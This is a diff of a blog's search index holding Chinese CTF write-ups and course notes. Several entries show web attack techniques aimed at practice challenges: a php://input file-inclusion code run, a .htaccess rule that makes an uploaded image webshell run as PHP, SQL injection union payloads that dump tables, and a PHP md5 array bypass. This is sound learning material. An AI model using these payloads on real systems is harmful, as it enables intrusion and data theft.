+    <title>压缩包破解</title>
+    <url>/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
+    <content><![CDATA[<h2 id="ZIP明文攻击"><a class="header-anchor" href="#ZIP明文攻击"></a>ZIP明文攻击</h2>
+<h3 id="CISCN-2017-WarmUp"><a class="header-anchor" href="#CISCN-2017-WarmUp"></a>[CISCN 2017] WarmUp</h3>
+<p>给我们的是一个加密的压缩包以及一个 readme.txt</p>
+<p>而压缩包中也存在该文件</p>
+<p>考虑ZIP明文攻击</p>
+<ol>
+<li>
+<p>将 readme.txt 压缩为 readme.zip</p>
+</li>
+<li>
+<p>使用 bandzip 打开，查看CRC校验码</p>
+</li>
+<li>
+<p>发现 readme.zip 与加密压缩包中的 readme.txt 校验码相同，说明可以使用ZIP明文攻击</p>
+</li>
+<li>
+<p>使用<code>ARCHPR</code>对加密压缩包进行破解即可</p>
+<p><img src="/2020/08/18/CTF/%E6%9D%82%E9%A1%B9/%E5%8E%8B%E7%BC%A9%E5%8C%85/image-20200818122011977.png" alt="image-20200818122011977"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="“百度杯”-2017-二月场-include"><a class="header-anchor" href="#“百度杯”-2017-二月场-include"></a>[“百度杯” 2017 二月场] include</h2>
+<p>简单的文件包含题。</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013712744.png" alt="image-20200818013712744"></p>
+<p>在phpinfo中可以发现</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818013827411.png" alt="image-20200818013827411"></p>
+<p><code>allow_url_fopen</code>关闭，<code>allow_url_include</code>开启，可能可以通过php伪协议 <code>php://input</code> 来执行我们的php代码</p>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014205521.png" alt="image-20200818014205521"></p>
+<p>尝试发现确实可行</p>
+<p>现在我们就可以任意执行php代码了</p>
+<p>对当前文件夹进行目录遍历</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myScanDir</span><span class="params">($dir)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file_arr = scandir($dir);</span><br><span class="line">        $new_arr = [];</span><br><span class="line">        <span class="keyword">foreach</span>($file_arr <span class="keyword">as</span> $item)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($item!=<span class="string">".."</span> &amp;&amp; $item !=<span class="string">"."</span>)&#123;</span><br><span class="line"></span><br><span class="line">                $new_arr[] = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $new_arr;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dir = myScanDir(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">    var_dump($dir); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/18/CTF/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200818014553708.png" alt="image-20200818014553708"></p>
+<p>输出文件内容即可得到flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">"./dle345aae.php"</span>);</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a class="header-anchor" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020] 你传你🐎呢</h2>
+<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200804123829115.png" alt="image-20200804123829115"></p>
+<p>尝试上传一些文件，发现只有.jpg 和 .htaccess 后缀的文件能够上传，<code>Content-Type</code>需要修改为 <code>image/jpeg</code></p>
+<p><img src="/2020/08/04/CTF/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1988809-20200401194611819-1412530212.png" alt="img"></p>
+<p><code>.htaccess</code>文件的利用：<a href="https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/">https://www.andseclab.com/2020/03/12/htaccess%E5%88%A9%E7%94%A8%E7%AF%87/</a></p>
+<p>通过上传一个<code>.htaccess</code>,能够将后面上传的jpg文件解析为php，这样就可以使用蚁剑连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>这里代码的意思是只要文件名中包含<code>1</code>，那么就当成php处理。</p>
+<p>然后我们再将一句话木马文件名修改为<code>1.jpg</code>，上传，即可成功访问。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ACTF校赛Web</title>
+    <url>/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/</url>
+    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
+<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
+<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
+<p>关注公众号，回复“一句话”即可</p>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
+<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
+<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
+<p>列换位密码，用密码学实验的脚本跑一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret=<span class="string">""</span></span><br><span class="line">secret=input(<span class="string">"ciphertext:"</span>)</span><br><span class="line">length=len(secret)</span><br><span class="line">print(length)</span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">26</span>):</span><br><span class="line">    k=length</span><br><span class="line">    <span class="keyword">while</span> k%n!=<span class="number">0</span>:</span><br><span class="line">        k=k+<span class="number">1</span></span><br><span class="line">    m=k//n</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i,length,m):</span><br><span class="line">            answer+=secret[j]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">' is '</span> <span class="keyword">in</span> answer :</span><br><span class="line">            print(<span class="string">"############"</span>)</span><br><span class="line">            print(answer)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
+<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
+<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
+<p><strong>flag值：（没记。。）</strong></p>
+<p>一个数字型SQL回显注入</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222156910.png" alt="image-20200529222156910"></p>
+<p>首先猜出字段数为4</p>
+<p>联合查询得到数据库名</p>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
+<p>数据表名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema&#x3D;&#39;easy_sql_injection&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
+<p>列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name),2,3,4 from information_schema.columns where table_name&#x3D;&#39;Notice&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
+<p>读取数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select group_concat(flag),2,3,4 from Notice</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
+<p><strong>flag值：（没记。。）</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'key'</span>] != $_SESSION[<span class="string">'key'</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Wrong key!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>]) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your password can not be your username!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
+<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>指令集和操作系统位数</title>
+    <url>/2020/06/10/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/</url>
+    <content><![CDATA[<h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
+<p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
+<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
+<p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
+<p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
+<p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
+<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
+<p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
+<p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>操作系统</category>
+      </categories>
+      <tags>
+        <tag>操作系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>国赛2020WP</title>
+    <url>/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/</url>
+    <content><![CDATA[<h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
+<h3 id="签到"><a class="header-anchor" href="#签到"></a>签到</h3>
+<p>助力即可得到flag</p>
+<h3 id="the-best-ctf-game"><a class="header-anchor" href="#the-best-ctf-game"></a>the_best_ctf_game</h3>
+<p>解压得到二进制文件:flag</p>
+<p>使用winhex打开</p>
+<p>观察到</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820142658465.png" alt="image-20200820142658465"></p>
+<p>即flag的值</p>
+<h3 id="电脑被黑"><a class="header-anchor" href="#电脑被黑"></a>电脑被黑</h3>
+<p>解压缩包得到disk_dump文件</p>
+<p>使用file 命令查看信息</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201008231.png" alt="image-20200820201008231"></p>
+<p>可以看到是ext3的文件系统</p>
+<p>挂载到 test文件夹下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount .&#x2F;disk_dump .&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201521587.png" alt="image-20200820201521587"></p>
+<p>查看???.png，提示flag已被删除</p>
+<p>使用extundelete恢复被删除的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete .&#x2F;disk_dump --restore-all</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820201902816.png" alt="image-20200820201902816"></p>
+<p>得到flag.txt，但打开后是乱码</p>
+<p>返回test/misc01文件夹下，看到可执行文件demo</p>
+<p>使用strings命令查看</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200820202222131.png" alt="image-20200820202222131"></p>
+<p>猜测demo对flag.txt进行了处理</p>
+<p>使用ida反编译查看其伪源码</p>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/20200820202837.png" alt="image-20200820202837"></p>
+<p>编写代码对flag文件进行解码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fileOld = fopen(<span class="string">"D:\\flag.txt"</span>,<span class="string">"rb"</span>);</span><br><span class="line">    FILE *fileNew = fopen(<span class="string">"D:\\flagNew.txt"</span>,<span class="string">"rb+"</span>);</span><br><span class="line">    <span class="keyword">char</span> v1,v4,v5;</span><br><span class="line">    v4 = <span class="number">34</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = fgetc(fileOld);</span><br><span class="line">        <span class="keyword">if</span>( v1 == <span class="number">-1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fputc(((v1^v4)-v5),fileNew);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fileNew);</span><br><span class="line">    fclose(fileOld);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解码后得到flag</p>
+<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
+<p>只做出来一道题</p>
+<h3 id="baby"><a class="header-anchor" href="#baby"></a>baby</h3>
+<p>一道RSA的密码学题目</p>
+<p>给了我们密文c和因数n，e很小。所以可以通过爆破的方式跑出明文</p>
+<p>解密脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy</span><br><span class="line">n &#x3D; 691316677109436623113422493782665795857921917893759942123087462879884062720557906429183155859597756890896192044003240821906332575292476160072039505771794531255542244123516929671277306361467074545720823735806308003091983427678300287709469582282466572230066580195227278214776280213722215953097747453437289734469454712426107967188109548966907237877840316009828476200388327329144783877033491238709954473809991152727333616022406517443130542713167206421787038596312975153165848625721911080561242646092299016802662913017071685740548699163836007474224715426587609549372289181977830092677128368806113131459831182390520942892670696447128631485606579943885812260640805756035377584155135770155915782120025116486061540105139339655722904721294629149025033066823599823964444620779259106176913478839370100891213072100063101232635183636552360952762838656307300621195248059253614745118852163569388418086291748805100175008658387803878200034840215506516715640621165661642177371863874586069524022258642915100615596032443145034847031564356671559179212705466145609698475546210994748949121359853094247990533075004393534565421776468785821261291309463205314057882016266066365636018084499158806717036972590848458891019171583268920180691221168453612029698510271</span><br><span class="line">c &#x3D; 3442467842482561323703237574537907554035337622762971103210557480050349359873041624336261782731509068910003360547049942482415036862904844600484976674423604861710166033558576921438068555951948966099658902606725292551952345193132973996288566246138708754810511646811362017769063041425115712305629748341207792305694590742066971202523405301561233341991037374101265623265332070787449332991792097090044761973705909217137119649091313457206589803479797894924402017273543719924849592070328396276760381501612934039653</span><br><span class="line">i &#x3D; 0</span><br><span class="line">while 1:</span><br><span class="line">    if(gmpy.root(c+i*n, 3)[1]&#x3D;&#x3D;1):</span><br><span class="line">        print gmpy.root(c+i*n, 3)</span><br><span class="line">        break</span><br><span class="line">    i &#x3D; i+1</span><br></pre></td></tr></table></figure>
+<p>结果是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br></pre></td></tr></table></figure>
+<p>再解码得到flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import libnum</span><br><span class="line">n&#x3D;1509929362729692740720713536968392715648402189242304424408501797538190273763219595501810359943405524344790331677540693316488309231687357778980543085568230705511696327037</span><br><span class="line">print(libnum.n2s(n))</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/22/CTF/%E6%AF%94%E8%B5%9B/%E5%9B%BD%E8%B5%9B2020/image-20200920135022901.png" alt="image-20200920135022901"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OSI模型</title>
+    <url>/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/</url>
+    <content><![CDATA[<h2 id="OSI-模型"><a class="header-anchor" href="#OSI-模型"></a>OSI 模型</h2>
+<h3 id="应用层"><a class="header-anchor" href="#应用层"></a>应用层</h3>
+<p>能产生数据流量的并且能与用户交互的程序</p>
+<p>记事本不是，因为不能产生数据流量</p>
+<h3 id="表示层"><a class="header-anchor" href="#表示层"></a>表示层</h3>
+<p>传递消息的语法和语义（不同内部数据表示法 编码方法 压缩 加密）</p>
+<h3 id="会话层"><a class="header-anchor" href="#会话层"></a>会话层</h3>
+<p>对话控制（记录该由谁来发送数据）</p>
+<p>令牌管理（禁止双方同时执行同一关键操作）</p>
+<p>同步功能（设置断点，崩溃恢复）</p>
+<h3 id="传输层"><a class="header-anchor" href="#传输层"></a>传输层</h3>
+<p>真正的端到端的层。解决的问题：<strong>进程与进程之间传输</strong>、识别进程</p>
+<h3 id="网络层"><a class="header-anchor" href="#网络层"></a>网络层</h3>
+<p>控制子网的运行 ，如何将数据包从源端路由到接收方。解决的问题：<strong>路由</strong>、<strong>拥塞控制</strong>、<strong>异构网络互联</strong></p>
+<h3 id="数据链路层"><a class="header-anchor" href="#数据链路层"></a>数据链路层</h3>
+<p>将一个原始的传输设施转变成一条没有漏检传输错误的线路。解决的问题：数据帧、流量控制、信道共享</p>
+<h3 id="物理层"><a class="header-anchor" href="#物理层"></a>物理层</h3>
+<p>关注在一条通信信道中传输原始比特。解决的问题：1，0的表示、比特维持时间、是否双向同时传输、连接建立，撤销、物理传输介质等</p>
+<p><img src="/2020/08/02/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E8%AE%A1%E7%BD%91/OSI%E6%A8%A1%E5%9E%8B/image-20200801114821400.png" alt="image-20200801114821400"></p>
+]]></content>
+      <categories>
+        <category>专业课</category>
+        <category>计网</category>
+      </categories>
+      <tags>
+        <tag>计算机网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>操作系统实验——内存扫描器设计实现</title>
+    <url>/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="实验内容"><a class="header-anchor" href="#实验内容"></a>实验内容</h2>
+<p>(1) 能直接从当前操作系统（或Windows操作系统或Linux操作系统）内存获取内存存储数据；</p>
+<p>(2) 能对获取的数据进行分析，包括内存结构、进程链表、页目录表结构、进程相关信息等；</p>
+<p>(3) 设计物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；</p>
+<p>(4) 设计物理内存数据修改功能，并展示内存数据修改后的结果；</p>
+<p>(5) 界面友好</p>
+<h2 id="总体设计"><a class="header-anchor" href="#总体设计"></a>总体设计</h2>
+<p>在本次实验中，我只实现了读取系统和内存信息，获取进程列表及进程相关信息，内存内容搜索，内存内容修改四个功能。每个功能分别由一个程序模块实现。程序开始运行时，调用<code>getSystemInfo</code>函数获取系统及内存基本信息，再调用<code>getProcessInfo</code>函数获取当前正在运行的所有进程及其对应pid，用户输入进程pid选择要扫描的进程后，调用<code>getMemoryBlock</code>扫描该进程使用的内存，逐一打印内存块信息（起始地址、内存块大小、内存块状态、访问权限等），打印完成后用户选择查询内存内容或者修改内存内容，这两个功能分别由<code>SearchProcessMemory</code>和<code>ModifyProcessMemory</code>实现。</p>
+<p><img src="/2020/06/19/%E4%B8%93%E4%B8%9A%E8%AF%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E2%80%94%E2%80%94%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/wps1.jpg" alt="img"></p>
+<h2 id="详细设计与实现"><a class="header-anchor" href="#详细设计与实现"></a>详细设计与实现</h2>
+<h3 id="数据结构设计"><a class="header-anchor" href="#数据结构设计"></a>数据结构设计</h3>
+<ol>
+<li>SYSTEM_INFO 系统信息结构体</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _SYSTEM_INFO &#123;</span><br><span class="line">    __C89_NAMELESS union &#123;</span><br><span class="line">      DWORD dwOemId;</span><br><span class="line">      __C89_NAMELESS struct &#123;</span><br><span class="line">  WORD wProcessorArchitecture;</span><br><span class="line">  WORD wReserved;</span><br><span class="line">      &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD dwPageSize;					&#x2F;&#x2F;页面大小</span><br><span class="line">    LPVOID lpMinimumApplicationAddress;	&#x2F;&#x2F;进程用户区起始地址</span><br><span class="line">    LPVOID lpMaximumApplicationAddress;	&#x2F;&#x2F;进程用户区上界</span><br><span class="line">    DWORD_PTR dwActiveProcessorMask;</span><br><span class="line">    DWORD dwNumberOfProcessors;</span><br><span class="line">    DWORD dwProcessorType;</span><br><span class="line">    DWORD dwAllocationGranularity;</span><br><span class="line">    WORD wProcessorLevel;</span><br><span class="line">    WORD wProcessorRevision;</span><br><span class="line">  &#125; SYSTEM_INFO;</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>MEMORYSTATUS 内存信息结构体</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _MEMORYSTATUS &#123;</span><br><span class="line">    DWORD dwLength;			&#x2F;&#x2F;MEMORYSTATUS结构的大小</span><br><span class="line">    DWORD dwMemoryLoad;		&#x2F;&#x2F;物理内存使用率</span><br><span class="line">    SIZE_T dwTotalPhys;		&#x2F;&#x2F;总物理内存</span><br><span class="line">    SIZE_T dwAvailPhys;		&#x2F;&#x2F;可用物理内存</span><br><span class="line">    SIZE_T dwTotalPageFile;	&#x2F;&#x2F;总页面文件大小</span><br><span class="line">    SIZE_T dwAvailPageFile;	&#x2F;&#x2F;可用页面文件大小</span><br><span class="line">    SIZE_T dwTotalVirtual;	&#x2F;&#x2F;总虚拟内存</span><br><span class="line">    SIZE_T dwAvailVirtual;	&#x2F;&#x2F;可用虚拟内存</span><br><span class="line">  &#125; MEMORYSTATUS</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>PROCESSENTRY32 进程快照信息结构体，用于获取正在运行的所有进程的信息</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct tagPROCESSENTRY32</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwSize;	&#x2F;&#x2F;结构体大小</span><br><span class="line">    DWORD cntUsage;	</span><br><span class="line">    DWORD th32ProcessID;	&#x2F;&#x2F;进程ID</span><br><span class="line">    ULONG_PTR th32DefaultHeapID;</span><br><span class="line">    DWORD th32ModuleID;</span><br><span class="line">    DWORD cntThreads;	&#x2F;&#x2F;线程数</span><br><span class="line">    DWORD th32ParentProcessID;</span><br><span class="line">    LONG pcPriClassBase;</span><br><span class="line">    DWORD dwFlags;</span><br><span class="line">    TCHAR szExeFile[MAX_PATH];	&#x2F;&#x2F;进程名称</span><br><span class="line">&#125; PROCESSENTRY32;</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>MEMORY_BASIC_INFORMATION32</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _MEMORY_BASIC_INFORMATION32 &#123;</span><br><span class="line">      DWORD BaseAddress;	&#x2F;&#x2F;指向页面区域基地址的指针</span><br><span class="line">      DWORD AllocationBase;&#x2F;&#x2F;指向VirtualAlloc函数分配的页面范围的基地址的指针。BaseAddress成员指向的页面包含在此分配范围内。</span><br><span class="line">      DWORD AllocationProtect;&#x2F;&#x2F;最初分配区域时的内存保护选项。该成员可以是内存保护常量之一，如果调用者没有访问权限，则该成员可以为 0。</span><br><span class="line">      DWORD RegionSize;&#x2F;&#x2F;从所有页具有相同属性的基地址开始的区域大小</span><br><span class="line">      DWORD State;&#x2F;&#x2F;区域中页面的状态，有MEM_COMMIT、MEM_FREE、MEM_RESERVE三种可能</span><br><span class="line">      DWORD Protect;&#x2F;&#x2F;区域中页面的访问保护。该成员是为AllocationProtect成员列出的值之一。</span><br><span class="line">      DWORD Type;区域中页面的类型，有MEM_IMAGE、MEM_MAPPED、MEM_PRIVATE三种可能</span><br><span class="line">    &#125; MEMORY_BASIC_INFORMATION32;</span><br></pre></td></tr></table></figure>
+<h3 id="getSystemInfo-模块的设计与实现"><a class="header-anchor" href="#getSystemInfo-模块的设计与实现"></a>getSystemInfo 模块的设计与实现</h3>
